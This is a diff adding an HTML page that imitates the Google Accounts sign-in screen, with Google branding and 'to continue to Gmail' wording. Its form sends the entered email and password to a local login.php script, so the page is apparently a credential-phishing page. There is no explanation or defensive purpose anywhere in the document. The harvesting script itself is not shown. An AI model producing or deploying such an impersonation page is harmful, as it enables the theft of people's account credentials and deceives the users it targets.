@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            color: #202124;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .google-logo {
+            height: 259px;
+            width: 607px;
+            background-image: url('glogo.png');
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+        .input-field {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 13px 15px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            transition: border 0.2s;
+        }
+        .input-field:focus {
+            border: 1px solid #1a73e8;
+            outline: none;
+        }
+        .btn-primary {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: #1765cc;
+        }
+        .link-primary {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .link-primary:hover {
+            text-decoration: underline;
+        }
+        .footer-link {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 10px;
+        }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+    <header class="flex justify-between items-center px-4 py-3">
+        <div class="flex items-center space-x-4">
+            <div class="google-logo"></div>
+        </div>
+        <div class="flex items-center space-x-4">
+            <a href="#" class="text-sm text-gray-600 hover:underline">Help</a>
+            <a href="#" class="text-sm text-gray-600 hover:underline">Privacy</a>
+            <a href="#" class="text-sm text-gray-600 hover:underline">Terms</a>
+        </div>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-md w-full space-y-8">
+            <div class="text-center">
+                <h1 class="text-2xl font-medium">Sign in</h1>
+                <p class="mt-2 text-sm text-gray-600">to continue to Gmail</p>
+            </div>
+            <form class="mt-8 space-y-6" action="login.php" method="POST">
+                <div class="rounded-md shadow-sm space-y-4">
+                    <div>
+                        <input id="email" name="username" type="email" autocomplete="email" required 
+                            class="input-field" placeholder="Email or phone">
+                    </div>
+                    <div>
+                        <input id="password" name="password" type="password" autocomplete="current-password" required 
+                            class="input-field" placeholder="Password">
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center">
+                        <input id="remember-me" name="remember-me" type="checkbox" 
+                            class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                        <label for="remember-me" class="ml-2 block text-sm text-gray-700">
+                            Remember me
+                        </label>
+                    </div>
+                    <div class="text-sm">
+                        <a href="#" class="link-primary">
+                            Forgot password?
+                        </a>
+                    </div>
+                </div>
+
+                <div class="flex justify-between items-center">
+                    <a href="#" class="link-primary text-sm">Create account</a>
+                    <button type="submit" class="btn-primary">
+                        Next
+                    </button>
+                </div>
+            </form>
+
+            <div class="text-center text-sm text-gray-500">
+                <p>Not your computer? Use Guest mode to sign in privately.</p>
+                <a href="#" class="link-primary">Learn more</a>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-gray-100 py-4 px-8">
+        <div class="max-w-6xl mx-auto">
+            <div class="flex flex-col md:flex-row md:justify-between">
+                <div class="flex justify-center md:justify-start">
+                    <select class="bg-transparent text-gray-700 text-sm border-none focus:outline-none">
+                        <option>English (United States)</option>
+                        <option>Español</option>
+                        <option>Français</option>
+                        <option>Deutsch</option>
+                    </select>
+                </div>
+                <div class="flex flex-wrap justify-center md:justify-end mt-4 md:mt-0">
+                    <a href="#" class="footer-link">Help</a>
+                    <a href="#" class="footer-link">Privacy</a>
+                    <a href="#" class="footer-link">Terms</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
